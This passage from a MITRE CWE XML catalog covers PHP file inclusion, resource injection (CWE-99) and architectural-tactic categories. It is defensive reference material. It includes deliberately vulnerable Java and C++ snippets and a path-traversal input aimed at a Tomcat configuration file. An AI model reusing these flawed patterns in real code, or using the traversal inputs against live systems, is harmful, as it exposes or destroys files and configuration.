               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1704</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1707</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1707</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1964</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1964</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1681</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1681</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2086</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2086</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0127</Reference>
               <Description>Directory traversal vulnerability in PHP include statement.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0127</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1971</Reference>
               <Description>Directory traversal vulnerability in PHP include statement.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1971</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3335</Reference>
               <Description>PHP file inclusion issue, both remote and local; local include uses ".." and "%00" characters as a manipulation, but many remote file inclusion issues probably have this vector.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3335</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1936</Reference>
               <Description>chain: library file sends a redirect if it is directly requested but continues to execute, allowing remote file inclusion and path traversal.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1936</Link>
            </Observed_Example>
         </Observed_Examples>
         <Affected_Resources>
            <Affected_Resource>File or Directory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>PHP File Include</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Malicious File Execution</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>5</Entry_ID>
               <Entry_Name>Remote File Inclusion</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="193"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-185"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-951"/>
            <Reference External_Reference_ID="REF-952"/>
            <Reference External_Reference_ID="REF-953"/>
         </References>
         <Notes>
            <Note Type="Relationship">
               <xhtml:p>This is frequently a functional consequence of other weaknesses. It is usually multi-factor with other factors (e.g. MAID), although not all inclusion bugs involve assumed-immutable data. Direct request weaknesses frequently play a role.</xhtml:p>
               <xhtml:p>Can overlap directory traversal in local inclusion problems.</xhtml:p>
            </Note>
            <Note Type="Research Gap">Under-researched and under-reported. Other interpreted languages with "require" and "include" functionality could also product vulnerable applications, but as of 2007, PHP has been the focus. Any web-accessible language that uses executable file extensions is likely to have this type of issue, such as ASP, since .asp extensions are typically executable. Languages such as Perl are less likely to exhibit these problems because the .pl extension isn't always configured to be executable by the web server.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="99" Name="Improper Control of Resource Identifiers ('Resource Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software receives input from an upstream component, but it does not restrict or incorrectly restricts the input before it is used as an identifier for a resource that may be outside the intended sphere of control.</Description>
         <Extended_Description>
            <xhtml:p>A resource injection issue occurs when the following two conditions are met:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ol>
                  <xhtml:li>An attacker can specify the identifier used to access a system resource. For example, an attacker might be able to specify part of the name of a file to be opened or a port number to be used.</xhtml:li>
                  <xhtml:li>By specifying the resource, the attacker gains a capability that would not otherwise be permitted. For example, the program may give the attacker the ability to overwrite the specified file, run with a configuration controlled by the attacker, or transmit sensitive information to a third-party server.</xhtml:li>
               </xhtml:ol>
            </xhtml:div>
            <xhtml:p>This may enable an attacker to access or modify otherwise protected system resources.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="706" View_ID="1000"/>
            <Related_Weakness Nature="CanAlsoBe" CWE_ID="73" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Insecure Direct Object Reference</Term>
               <Description>OWASP uses this term, although it is effectively the same as resource injection.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>An attacker could gain access to or modify sensitive data or system resources. This could allow access to protected files or directories including configuration files and files containing sensitive information.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following Java code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as "../../tomcat/conf/server.xml", which causes the application to delete one of its own configuration files.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>String rName = request.getParameter("reportName");<xhtml:br/>File rFile = new File("/usr/local/apfr/reports/" + rName);<xhtml:br/>...<xhtml:br/>rFile.delete();</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code uses input from the command line to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can create soft links to the file, they can use the program to read the first part of any file on the system.</Intro_Text>
               <Example_Code Nature="bad" Language="C++">
                  <xhtml:div>ifstream ifs(argv[0]);<xhtml:br/>string s;<xhtml:br/>ifs &gt;&gt; s;<xhtml:br/>cout &lt;&lt; s;</xhtml:div>
               </Example_Code>
               <Body_Text>The kind of resource the data affects indicates the kind of content that may be dangerous. For example, data containing special characters like period, slash, and backslash, are risky when used in methods that interact with the file system. (Resource injection, when it is related to file system resources, sometimes goes by the name "path manipulation.") Similarly, data that contains URLs and URIs is risky for functions that create remote connections.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Resource Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-99</Entry_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="10"/>
            <Related_Attack_Pattern CAPEC_ID="240"/>
            <Related_Attack_Pattern CAPEC_ID="75"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-99"/>
         </References>
         <Notes>
            <Note Type="Relationship">Resource injection that involves resources stored on the filesystem goes by the name path manipulation (CWE-73).</Note>
            <Note Type="Maintenance">The relationship between CWE-99 and CWE-610 needs further investigation and clarification. They might be duplicates. CWE-99 "Resource Injection," as originally defined in Seven Pernicious Kingdoms taxonomy, emphasizes the "identifier used to access a system resource" such as a file name or port number, yet it explicitly states that the "resource injection" term does not apply to "path manipulation," which effectively identifies the path at which a resource can be found and could be considered to be one aspect of a resource identifier. Also, CWE-610 effectively covers any type of resource, whether that resource is at the system layer, the application layer, or the code layer.</Note>
            <Note Type="Other">
               <xhtml:p>A resource injection issue occurs when the following two conditions are met:</xhtml:p>
               <xhtml:div style="margin-left:10px;">
                  <xhtml:ol>
                     <xhtml:li>An attacker can specify the identifier used to access a system resource. For example, an attacker might be able to specify part of the name of a file to be opened or a port number to be used.</xhtml:li>
                     <xhtml:li>By specifying the resource, the attacker gains a capability that would not otherwise be permitted. For example, the program may give the attacker the ability to overwrite the specified file, run with a configuration controlled by the attacker, or transmit sensitive information to a third-party server.</xhtml:li>
                  </xhtml:ol>
               </xhtml:div>
               <xhtml:p>Note: Resource injection that involves resources stored on the filesystem goes by the name path manipulation and is reported in a separate category. See the path manipulation description for further details of this vulnerability.</xhtml:p>
            </Note>
         </Notes>
         
      </Weakness>
   </Weaknesses>
   <Categories>
      <Category ID="1009" Name="Audit" Status="Draft">
         <Summary>Weaknesses in this category are related to the design and architecture of audit-based components of the system. Frequently these deal with logging user activities in order to identify attackers and modifications to the system. The weaknesses in this category could lead to a degradation of the quality of the audit capability if they are not addressed when designing or implementing a secure architecture.</Summary>
         <Relationships>
            <Has_Member CWE_ID="117" View_ID="1008"/>
            <Has_Member CWE_ID="223" View_ID="1008"/>
            <Has_Member CWE_ID="224" View_ID="1008"/>
            <Has_Member CWE_ID="532" View_ID="1008"/>
            <Has_Member CWE_ID="778" View_ID="1008"/>
            <Has_Member CWE_ID="779" View_ID="1008"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-9"/>
            <Reference External_Reference_ID="REF-10" Section="pages 69 - 78"/>
         </References>
         
      </Category>
      <Category ID="1010" Name="Authenticate Actors" Status="Draft">
         <Summary>Weaknesses in this category are related to the design and architecture of authentication components of the system. Frequently these deal with verifying the entity is indeed who it claims to be. The weaknesses in this category could lead to a degradation of the quality of authentication if they are not addressed when designing or implementing a secure architecture.</Summary>
         <Relationships>
            <Has_Member CWE_ID="258" View_ID="1008"/>
            <Has_Member CWE_ID="259" View_ID="1008"/>
            <Has_Member CWE_ID="262" View_ID="1008"/>
            <Has_Member CWE_ID="263" View_ID="1008"/>
            <Has_Member CWE_ID="287" View_ID="1008"/>
            <Has_Member CWE_ID="288" View_ID="1008"/>
            <Has_Member CWE_ID="289" View_ID="1008"/>
            <Has_Member CWE_ID="290" View_ID="1008"/>
            <Has_Member CWE_ID="291" View_ID="1008"/>
            <Has_Member CWE_ID="293" View_ID="1008"/>
            <Has_Member CWE_ID="294" View_ID="1008"/>
            <Has_Member CWE_ID="301" View_ID="1008"/>
            <Has_Member CWE_ID="302" View_ID="1008"/>
            <Has_Member CWE_ID="303" View_ID="1008"/>
            <Has_Member CWE_ID="304" View_ID="1008"/>
            <Has_Member CWE_ID="305" View_ID="1008"/>
            <Has_Member CWE_ID="306" View_ID="1008"/>
            <Has_Member CWE_ID="307" View_ID="1008"/>
            <Has_Member CWE_ID="308" View_ID="1008"/>
            <Has_Member CWE_ID="322" View_ID="1008"/>
            <Has_Member CWE_ID="521" View_ID="1008"/>
            <Has_Member CWE_ID="593" View_ID="1008"/>
            <Has_Member CWE_ID="603" View_ID="1008"/>
            <Has_Member CWE_ID="620" View_ID="1008"/>
            <Has_Member CWE_ID="640" View_ID="1008"/>
            <Has_Member CWE_ID="798" View_ID="1008"/>
            <Has_Member CWE_ID="836" View_ID="1008"/>
            <Has_Member CWE_ID="916" View_ID="1008"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-9"/>
            <Reference External_Reference_ID="REF-10" Section="pages 69 - 78"/>
         </References>
         
      </Category>
      <Category ID="1011" Name="Authorize Actors" Status="Draft">
         <Summary>Weaknesses in this category are related to the design and architecture of a system's authorization components. Frequently these deal with enforcing that agents have the required permissions before performing certain operations, such as modifying data. The weaknesses in this category could lead to a degredation of quality of the authorization capability if they are not addressed when designing or implementing a secure architecture.</Summary>
         <Relationships>
            <Has_Member CWE_ID="114" View_ID="1008"/>
            <Has_Member CWE_ID="15" View_ID="1008"/>
            <Has_Member CWE_ID="219" View_ID="1008"/>
            <Has_Member CWE_ID="220" View_ID="1008"/>
            <Has_Member CWE_ID="266" View_ID="1008"/>
            <Has_Member CWE_ID="267" View_ID="1008"/>
            <Has_Member CWE_ID="268" View_ID="1008"/>
            <Has_Member CWE_ID="269" View_ID="1008"/>
            <Has_Member CWE_ID="270" View_ID="1008"/>
            <Has_Member CWE_ID="271" View_ID="1008"/>
            <Has_Member CWE_ID="272" View_ID="1008"/>
            <Has_Member CWE_ID="273" View_ID="1008"/>
            <Has_Member CWE_ID="274" View_ID="1008"/>
            <Has_Member CWE_ID="276" View_ID="1008"/>
            <Has_Member CWE_ID="277" View_ID="1008"/>
            <Has_Member CWE_ID="279" View_ID="1008"/>
            <Has_Member CWE_ID="280" View_ID="1008"/>
            <Has_Member CWE_ID="281" View_ID="1008"/>
            <Has_Member CWE_ID="282" View_ID="1008"/>
            <Has_Member CWE_ID="283" View_ID="1008"/>
            <Has_Member CWE_ID="284" View_ID="1008"/>
            <Has_Member CWE_ID="285" View_ID="1008"/>
            <Has_Member CWE_ID="286" View_ID="1008"/>
            <Has_Member CWE_ID="300" View_ID="1008"/>
            <Has_Member CWE_ID="341" View_ID="1008"/>
            <Has_Member CWE_ID="359" View_ID="1008"/>
            <Has_Member CWE_ID="403" View_ID="1008"/>
            <Has_Member CWE_ID="419" View_ID="1008"/>
            <Has_Member CWE_ID="420" View_ID="1008"/>
            <Has_Member CWE_ID="425" View_ID="1008"/>
            <Has_Member CWE_ID="426" View_ID="1008"/>
            <Has_Member CWE_ID="434" View_ID="1008"/>
            <Has_Member CWE_ID="527" View_ID="1008"/>
            <Has_Member CWE_ID="528" View_ID="1008"/>
            <Has_Member CWE_ID="529" View_ID="1008"/>
            <Has_Member CWE_ID="530" View_ID="1008"/>
            <Has_Member CWE_ID="538" View_ID="1008"/>
            <Has_Member CWE_ID="551" View_ID="1008"/>
            <Has_Member CWE_ID="552" View_ID="1008"/>
            <Has_Member CWE_ID="566" View_ID="1008"/>
            <Has_Member CWE_ID="639" View_ID="1008"/>
            <Has_Member CWE_ID="642" View_ID="1008"/>
            <Has_Member CWE_ID="647" View_ID="1008"/>
            <Has_Member CWE_ID="653" View_ID="1008"/>
            <Has_Member CWE_ID="656" View_ID="1008"/>
            <Has_Member CWE_ID="668" View_ID="1008"/>
            <Has_Member CWE_ID="669" View_ID="1008"/>
            <Has_Member CWE_ID="671" View_ID="1008"/>
            <Has_Member CWE_ID="673" View_ID="1008"/>
            <Has_Member CWE_ID="708" View_ID="1008"/>
            <Has_Member CWE_ID="732" View_ID="1008"/>
            <Has_Member CWE_ID="770" View_ID="1008"/>
            <Has_Member CWE_ID="782" View_ID="1008"/>
            <Has_Member CWE_ID="827" View_ID="1008"/>
            <Has_Member CWE_ID="862" View_ID="1008"/>
            <Has_Member CWE_ID="863" View_ID="1008"/>
            <Has_Member CWE_ID="921" View_ID="1008"/>
            <Has_Member CWE_ID="923" View_ID="1008"/>
            <Has_Member CWE_ID="939" View_ID="1008"/>
            <Has_Member CWE_ID="942" View_ID="1008"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-9"/>
            <Reference External_Reference_ID="REF-10" Section="pages 69 - 78"/>
         </References>
         
      </Category>
      <Category ID="1012" Name="Cross Cutting" Status="Draft">
         <Summary>Weaknesses in this category are related to the design and architecture of multiple security tactics and how they affect a system. For example, information exposure can impact the Limit Access and Limit Exposure security tactics. The weaknesses in this category could lead to a degradation of the quality of many capabilities if they are not addressed when designing or implementing a secure architecture.</Summary>
         <Relationships>
            <Has_Member CWE_ID="208" View_ID="1008"/>
            <Has_Member CWE_ID="392" View_ID="1008"/>
            <Has_Member CWE_ID="460" View_ID="1008"/>
            <Has_Member CWE_ID="544" View_ID="1008"/>
            <Has_Member CWE_ID="602" View_ID="1008"/>
            <Has_Member CWE_ID="703" View_ID="1008"/>
            <Has_Member CWE_ID="754" View_ID="1008"/>
            <Has_Member CWE_ID="784" View_ID="1008"/>
            <Has_Member CWE_ID="807" View_ID="1008"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-9"/>
            <Reference External_Reference_ID="REF-10" Section="pages 69 - 78"/>
         </References>
         
      </Category>
      <Category ID="1013" Name="Encrypt Data" Status="Draft">
         <Summary>Weaknesses in this category are related to the design and architecture of data confidentiality in a system. Frequently these deal with the use of encryption libraries. The weaknesses in this category could lead to a degradation of the quality data encyprtion if they are not addressed when designing or implementing a secure architecture.</Summary>
         <Relationships>
            <Has_Member CWE_ID="256" View_ID="1008"/>
            <Has_Member CWE_ID="257" View_ID="1008"/>
            <Has_Member CWE_ID="260" View_ID="1008"/>
            <Has_Member CWE_ID="261" View_ID="1008"/>
            <Has_Member CWE_ID="311" View_ID="1008"/>
            <Has_Member CWE_ID="312" View_ID="1008"/>
            <Has_Member CWE_ID="313" View_ID="1008"/>
            <Has_Member CWE_ID="314" View_ID="1008"/>
            <Has_Member CWE_ID="315" View_ID="1008"/>
            <Has_Member CWE_ID="316" View_ID="1008"/>
            <Has_Member CWE_ID="317" View_ID="1008"/>
            <Has_Member CWE_ID="318" View_ID="1008"/>
            <Has_Member CWE_ID="319" View_ID="1008"/>
            <Has_Member CWE_ID="321" View_ID="1008"/>
            <Has_Member CWE_ID="323" View_ID="1008"/>
            <Has_Member CWE_ID="324" View_ID="1008"/>
            <Has_Member CWE_ID="325" View_ID="1008"/>
            <Has_Member CWE_ID="326" View_ID="1008"/>
            <Has_Member CWE_ID="327" View_ID="1008"/>
            <Has_Member CWE_ID="328" View_ID="1008"/>
            <Has_Member CWE_ID="330" View_ID="1008"/>
            <Has_Member CWE_ID="331" View_ID="1008"/>
            <Has_Member CWE_ID="332" View_ID="1008"/>
            <Has_Member CWE_ID="333" View_ID="1008"/>
            <Has_Member CWE_ID="334" View_ID="1008"/>
            <Has_Member CWE_ID="335" View_ID="1008"/>
            <Has_Member CWE_ID="336" View_ID="1008"/>
            <Has_Member CWE_ID="337" View_ID="1008"/>
            <Has_Member CWE_ID="338" View_ID="1008"/>
            <Has_Member CWE_ID="339" View_ID="1008"/>
            <Has_Member CWE_ID="347" View_ID="1008"/>
            <Has_Member CWE_ID="522" View_ID="1008"/>
            <Has_Member CWE_ID="523" View_ID="1008"/>
            <Has_Member CWE_ID="757" View_ID="1008"/>
            <Has_Member CWE_ID="759" View_ID="1008"/>
            <Has_Member CWE_ID="760" View_ID="1008"/>
            <Has_Member CWE_ID="780" View_ID="1008"/>
            <Has_Member CWE_ID="922" View_ID="1008"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-9"/>
            <Reference External_Reference_ID="REF-10" Section="pages 69 - 78"/>
         </References>
         
      </Category>
      <Category ID="1014" Name="Identify Actors" Status="Draft">
         <Summary>Weaknesses in this category are related to the design and architecture of a system's identification management components. Frequently these deal with verifying that external agents provide inputs into the system. The weaknesses in this category could lead to a degradation of the quality of identification maangment if they are not addressed when designing or implementing a secure architecture.</Summary>
         <Relationships>
            <Has_Member CWE_ID="295" View_ID="1008"/>
            <Has_Member CWE_ID="296" View_ID="1008"/>
            <Has_Member CWE_ID="297" View_ID="1008"/>
            <Has_Member CWE_ID="298" View_ID="1008"/>
            <Has_Member CWE_ID="299" View_ID="1008"/>
            <Has_Member CWE_ID="345" View_ID="1008"/>
            <Has_Member CWE_ID="346" View_ID="1008"/>
            <Has_Member CWE_ID="370" View_ID="1008"/>
            <Has_Member CWE_ID="441" View_ID="1008"/>
            <Has_Member CWE_ID="599" View_ID="1008"/>
            <Has_Member CWE_ID="940" View_ID="1008"/>
            <Has_Member CWE_ID="941" View_ID="1008"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-9"/>
            <Reference External_Reference_ID="REF-10" Section="pages 69 - 78"/>
         </References>
         
      </Category>
      <Category ID="1015" Name="Limit Access" Status="Draft">
         <Summary>Weaknesses in this category are related to the design and architecture of system resources. Frequently these deal with restricting the amount of resources that are accessed by actors, such as memory, network connections, CPU or access points. The weaknesses in this category could lead to a degradation of the quality of authentication if they are not addressed when designing or implementing a secure architecture.</Summary>
         <Relationships>
            <Has_Member CWE_ID="201" View_ID="1008"/>
            <Has_Member CWE_ID="209" View_ID="1008"/>
            <Has_Member CWE_ID="212" View_ID="1008"/>
            <Has_Member CWE_ID="243" View_ID="1008"/>
            <Has_Member CWE_ID="250" View_ID="1008"/>
            <Has_Member CWE_ID="610" View_ID="1008"/>
            <Has_Member CWE_ID="611" View_ID="1008"/>
            <Has_Member CWE_ID="73" View_ID="1008"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-9"/>
            <Reference External_Reference_ID="REF-10" Section="pages 69 - 78"/>
         </References>
         
      </Category>
      <Category ID="1016" Name="Limit Exposure" Status="Draft">
         <Summary>Weaknesses in this category are related to the design and architecture of the entry points to a system. Frequently these deal with minimizing the attack surface through designing the system with the least needed amount of entry points. The weaknesses in this category could lead to a degradation of a system's defenses if they are not addressed when designing or implementing a secure architecture.</Summary>
         <Relationships>
            <Has_Member CWE_ID="210" View_ID="1008"/>
            <Has_Member CWE_ID="211" View_ID="1008"/>
            <Has_Member CWE_ID="214" View_ID="1008"/>
            <Has_Member CWE_ID="550" View_ID="1008"/>
            <Has_Member CWE_ID="829" View_ID="1008"/>
            <Has_Member CWE_ID="830" View_ID="1008"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-9"/>
            <Reference External_Reference_ID="REF-10" Section="pages 69 - 78"/>
         </References>
         
      </Category>
      <Category ID="1017" Name="Lock Computer" Status="Draft">
         <Summary>Weaknesses in this category are related to the design and architecture of a system's lockout mechanism. Frequently these deal with scenarios that take effect in case of multiple failed attempts to access a given resource. The weaknesses in this category could lead to a degradation of access to system assets if they are not addressed when designing or implementing a secure architecture.</Summary>
         <Relationships>
            <Has_Member CWE_ID="645" View_ID="1008"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-9"/>
            <Reference External_Reference_ID="REF-10" Section="pages 69 - 78"/>
         </References>
         
      </Category>
      <Category ID="1018" Name="Manage User Sessions" Status="Draft">
         <Summary>Weaknesses in this category are related to the design and architecture of session managment. Frequently these deal with the information or status about each user and their access rights for the duration of multiple requests. The weaknesses in this category could lead to a degradation of the quality of session managment if they are not addressed when designing or implementing a secure architecture.</Summary>
         <Relationships>
            <Has_Member CWE_ID="384" View_ID="1008"/>
            <Has_Member CWE_ID="488" View_ID="1008"/>
            <Has_Member CWE_ID="579" View_ID="1008"/>
            <Has_Member CWE_ID="6" View_ID="1008"/>
            <Has_Member CWE_ID="613" View_ID="1008"/>
            <Has_Member CWE_ID="841" View_ID="1008"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-9"/>
            <Reference External_Reference_ID="REF-10" Section="pages 69 - 78"/>
         </References>
         
      </Category>
      <Category ID="1019" Name="Validate Inputs" Status="Draft">
         <Summary>Weaknesses in this category are related to the design and architecture of a system's input validation components. Frequently these deal with sanitizing, neutralizing and validating any externally provided inputs to minimize malformed data from entering the system and preventing code injection in the input data. The weaknesses in this category could lead to a degradation of the quality of data flow in a system if they are not addressed when designing or implementing a secure architecture.</Summary>
         <Relationships>
            <Has_Member CWE_ID="138" View_ID="1008"/>
            <Has_Member CWE_ID="150" View_ID="1008"/>
            <Has_Member CWE_ID="20" View_ID="1008"/>
            <Has_Member CWE_ID="349" View_ID="1008"/>
            <Has_Member CWE_ID="352" View_ID="1008"/>
            <Has_Member CWE_ID="472" View_ID="1008"/>
            <Has_Member CWE_ID="473" View_ID="1008"/>
            <Has_Member CWE_ID="502" View_ID="1008"/>
            <Has_Member CWE_ID="59" View_ID="1008"/>
            <Has_Member CWE_ID="601" View_ID="1008"/>
            <Has_Member CWE_ID="641" View_ID="1008"/>
            <Has_Member CWE_ID="643" View_ID="1008"/>
            <Has_Member CWE_ID="652" View_ID="1008"/>
            <Has_Member CWE_ID="74" View_ID="1008"/>
            <Has_Member CWE_ID="75" View_ID="1008"/>
            <Has_Member CWE_ID="76" View_ID="1008"/>
            <Has_Member CWE_ID="77" View_ID="1008"/>
            <Has_Member CWE_ID="78" View_ID="1008"/>
            <Has_Member CWE_ID="79" View_ID="1008"/>
            <Has_Member CWE_ID="790" View_ID="1008"/>
            <Has_Member CWE_ID="791" View_ID="1008"/>
            <Has_Member CWE_ID="792" View_ID="1008"/>
            <Has_Member CWE_ID="793" View_ID="1008"/>
            <Has_Member CWE_ID="794" View_ID="1008"/>
            <Has_Member CWE_ID="795" View_ID="1008"/>
            <Has_Member CWE_ID="796" View_ID="1008"/>
            <Has_Member CWE_ID="797" View_ID="1008"/>
            <Has_Member CWE_ID="88" View_ID="1008"/>
            <Has_Member CWE_ID="89" View_ID="1008"/>
            <Has_Member CWE_ID="90" View_ID="1008"/>
            <Has_Member CWE_ID="91" View_ID="1008"/>
            <Has_Member CWE_ID="93" View_ID="1008"/>
            <Has_Member CWE_ID="94" View_ID="1008"/>
            <Has_Member CWE_ID="943" View_ID="1008"/>
            <Has_Member CWE_ID="95" View_ID="1008"/>
            <Has_Member CWE_ID="96" View_ID="1008"/>
            <Has_Member CWE_ID="97" View_ID="1008"/>
            <Has_Member CWE_ID="98" View_ID="1008"/>
            <Has_Member CWE_ID="99" View_ID="1008"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-9"/>
            <Reference External_Reference_ID="REF-10" Section="pages 69 - 78"/>
         </References>
         
      </Category>
      <Category ID="1020" Name="Verify Message Integrity" Status="Draft">
         <Summary>Weaknesses in this category are related to the design and architecture of a system's data integrity components. Frequently these deal with ensuring integrity of data, such as messages, resource files, deployment files, and configuration files. The weaknesses in this category could lead to a degradation of data integrity quality if they are not addressed when designing or implementing a secure architecture.</Summary>
         <Relationships>
            <Has_Member CWE_ID="353" View_ID="1008"/>
            <Has_Member CWE_ID="354" View_ID="1008"/>
            <Has_Member CWE_ID="390" View_ID="1008"/>
            <Has_Member CWE_ID="391" View_ID="1008"/>
            <Has_Member CWE_ID="494" View_ID="1008"/>
            <Has_Member CWE_ID="565" View_ID="1008"/>
            <Has_Member CWE_ID="649" View_ID="1008"/>
            <Has_Member CWE_ID="707" View_ID="1008"/>
            <Has_Member CWE_ID="755" View_ID="1008"/>
            <Has_Member CWE_ID="924" View_ID="1008"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-9"/>
            <Reference External_Reference_ID="REF-10" Section="pages 69 - 78"/>
         </References>
         
      </Category>
   </Categories>
   <Views>
      <View ID="1008" Name="Architectural Concepts" Type="Graph" Status="Incomplete">
         <Objective>This view organizes weaknesses according to common architectural security tactics. It is intended to assist architects in identifying potential mistakes that can be made when designing software.</Objective>
         <Audience>
            <Stakeholder>
               <Type>Software Designers</Type>
               <Description>Software designers may find this view useful as the weaknesses are organized by known security tactics, aiding the designer in embedding security throughout the design process instead of discovering weaknesses after the software has been built.</Description>
            </Stakeholder>
            <Stakeholder>
               <Type>Educators</Type>
               <Description>Educators may use this view as reference material when discussing security by design or architectural weaknesses, and the types of mistakes that can be made.</Description>
            </Stakeholder>
         </Audience>
         <Members>
            <Has_Member CWE_ID="1009" View_ID="1008"/>
            <Has_Member CWE_ID="1010" View_ID="1008"/>
            <Has_Member CWE_ID="1011" View_ID="1008"/>
            <Has_Member CWE_ID="1012" View_ID="1008"/>
            <Has_Member CWE_ID="1013" View_ID="1008"/>
            <Has_Member CWE_ID="1014" View_ID="1008"/>
            <Has_Member CWE_ID="1015" View_ID="1008"/>
            <Has_Member CWE_ID="1016" View_ID="1008"/>
            <Has_Member CWE_ID="1017" View_ID="1008"/>
            <Has_Member CWE_ID="1018" View_ID="1008"/>
            <Has_Member CWE_ID="1019" View_ID="1008"/>
            <Has_Member CWE_ID="1020" View_ID="1008"/>
         </Members>
         <References>
